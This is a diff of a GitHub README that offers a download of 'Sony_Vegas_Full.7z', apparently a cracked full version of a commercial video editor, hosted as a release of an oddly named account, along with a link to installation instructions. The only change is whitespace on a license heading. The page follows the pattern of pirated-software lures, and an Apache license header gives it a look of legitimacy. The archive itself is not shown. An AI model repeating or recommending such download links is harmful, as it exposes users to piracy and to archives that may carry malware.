@@ -1,7 +1,7 @@
 # [DOWNLOAD](https://github.com/aknelamaep861/aknelamaep861/releases/download/latest/Sony_Vegas_Full.7z)
 # [Click here to view installation instructions](https://github.com/aknelamaep861/aknelamaep861/blob/main/Installation%20instructions.txt)
 
-# License:
+# License: 
 ### Apache License
 Version 2.0, January 2004
 http://www.apache.org/licenses/
